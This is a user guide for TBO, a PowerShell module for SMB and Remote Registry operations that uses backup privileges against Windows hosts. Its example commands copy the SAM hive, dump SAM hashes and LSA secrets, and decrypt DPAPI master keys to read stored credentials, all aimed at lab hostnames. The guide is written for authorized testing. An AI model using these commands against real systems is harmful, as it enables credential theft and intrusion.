# TBO User Guide

This guide is a curated, task-focused overview of TBO.
For the exhaustive cmdlet/provider reference (with lots of examples), see [Docs/Usage.md](Usage.md).

## What TBO Is

TBO (Titanis Backup Operator) is a PowerShell module and PSProvider built on the TrustedSec **Titanis** protocol library.
It's designed for backup-operator style workflows against remote Windows systems over SMB and Remote Registry.

Core idea: when your access token has **SeBackupPrivilege** / **SeRestorePrivilege**, TBO operations can bypass discretionary ACLs for reads/writes.

## Safety / Ethics

- Only use TBO on systems you are explicitly authorized to test or administer.
- Prefer `-WhatIf` / `-Confirm` when testing mutating operations.
- Treat any recovered secrets as high sensitivity (do not write them to shared locations by accident).
- Read [../DISCLAIMER.md](../DISCLAIMER.md).

## Getting Started (Typical Flow)

1. Import the module:

```powershell
Import-Module .\Titanis.TBO.Smb2.psd1 -Force
```

2. Set connection defaults for a server:

```powershell
Set-TBOConnectOptions `
  -ServerName corp1-web01.corp1.lab.home-labs.lol `
  -HostName corp1-web01.corp1.lab.home-labs.lol `
  -UserName psx_l_backupop `
  -UserDomain corp1.lab.home-labs.lol `
  -Password 'YourSecurePassword'
```

3. Create an SMB drive and start exploring:

```powershell
New-PSDrive -Name tbo -PSProvider 'TBO.Smb2' -Root '\\corp1-web01.corp1.lab.home-labs.lol\C$'
Set-Location tbo:\
Get-ChildItem
```

If you prefer not to create a drive, most cmdlets accept UNC paths and the provider supports provider-qualified paths like:

```powershell
Get-ChildItem TBO.Smb2::\\corp1-web01.corp1.lab.home-labs.lol\C$\Windows
```

## Connection Options (How TBO Knows What Credentials To Use)

TBO resolves connection settings in layers:

- Global defaults (no `-ServerName`)
- Per-server defaults (with `-ServerName`)
- `New-PSDrive` dynamic parameters override the resolved defaults for that specific drive/session

See [Docs/Usage.md#set-tboconnectoptions](Usage.md#set-tboconnectoptions) for examples (password, NTLM hash, Kerberos ticket cache, retry policy, etc).

## Providers And When To Use Them

### SMB Provider: `TBO.Smb2`

Use this when you want a "remote filesystem" experience (PowerShell drive semantics).

- Read: `Get-ChildItem`, `Get-Content`, `Copy-Item`, etc (with provider paths).
- Write text: `Set-Content` / `Add-Content`, or `Out-TBOSmbFile` for explicit SMB writes.
- Security descriptors: `Get-Acl` / `Set-Acl` (Windows), or `Get-TBOSmbSecurityDescriptor` / `Set-TBOSmbSecurityDescriptor` cross-platform.

Reference: [Docs/Usage.md](Usage.md) (see "Provider (TBO.Smb2)" and related cmdlets).

### Registry Provider: `TBO.Reg` (Preview)

Use this when you want PowerShell drive semantics over remote registry hives/keys/values.

```powershell
New-PSDrive -Name tbo-reg -PSProvider 'TBO.Reg' -Root corp1-web01.corp1.lab.home-labs.lol
Get-ChildItem tbo-reg:\HKLM\SOFTWARE -IncludeValues -IncludeData
```

Reference: [Docs/Usage.md](Usage.md) (see "Provider (TBO.Reg)").

## Caching (What Exists And Why)

TBO has three caches with different purposes:

1. **Winreg session cache (per-connection):** speeds up remote registry operations.
   - Details: [Docs/WinregSessionCaching.md](WinregSessionCaching.md)
2. **In-memory secret cache (per-connection):** derived secrets like boot key, LSA key, SAM master key, and **decrypted DPAPI master keys**.
   - Intended to reduce repeated derivation work and enable "do one expensive step once, then reuse".
3. **Persistent on-disk cache (SQLite):** used for ingestion/triage/export (`Get-TBOCacheInfo`, `Export-TBOCacheJson`, etc).
   - Enable writes per cmdlet with `-Cache`, or globally with `TITANIS_TBO_CACHE_INGEST`.
   - Exports include write activity rows when write-capable cmdlets are run with caching enabled.

Reference: [Docs/Usage.md](Usage.md) (see "Get-TBOCacheInfo", "Export-TBOCacheJson", and any cmdlets that accept `-Cache` / `-CachePath`).

## Common Workflows

### Copy A Protected File Off A Host

```powershell
Copy-TBOSmbItem -Source tbo:\Windows\System32\config\SAM -Destination C:\Temp\SAM.bak
```

Reference: [Docs/Usage.md#copy-tbosmbitem](Usage.md#copy-tbosmbitem).

### Remote Registry Triage

```powershell
Get-TBORegSecretLocations -ServerName corp1-web01.corp1.lab.home-labs.lol
Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol
```

Reference: [Docs/Usage.md](Usage.md) (Registry cmdlets section).

### DPAPI: Decrypt Master Keys Once, Then Reuse

Get DPAPI_SYSTEM and decrypt machine master keys:

```powershell
Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
  Get-TBODpapiMasterKeys -Scope Machine | Out-Null
```

After this, cmdlets that encounter DPAPI blobs may be able to reuse cached master keys without you re-supplying `-MasterKeys` every time (example: `Get-TBOCredManEntry`).

Reference:
- [Docs/Usage.md#get-tbodpapimasterkeys](Usage.md#get-tbodpapimasterkeys)
- [Docs/Usage.md#get-tbocredmanentry](Usage.md#get-tbocredmanentry)

### Export Cache For Offline Triage/Ingestion

```powershell
Export-TBOCacheJson | Set-Content -Path .\tbo-cache-export.json -Encoding utf8
```

Reference: [Docs/Usage.md#export-tbocachejson](Usage.md#export-tbocachejson).

## Troubleshooting

- **"context does not match any mechanisms supported by the server"** (Kerberos/UNC mismatch):
  - Ensure the UNC host name matches the name used in `Set-TBOConnectOptions` (FQDN vs short name).
- **Remote registry `STATUS_PIPE_BUSY`**:
  - TBO has a retry policy; see `Set-TBOConnectOptions -RetryPolicy ...` and [Docs/WinregSessionCaching.md](WinregSessionCaching.md).
- **More diagnostics**:
  - Use `-Verbose` and/or set `TITANIS_TBO_LOG` (see [Docs/Usage.md](Usage.md) "Local Logging").
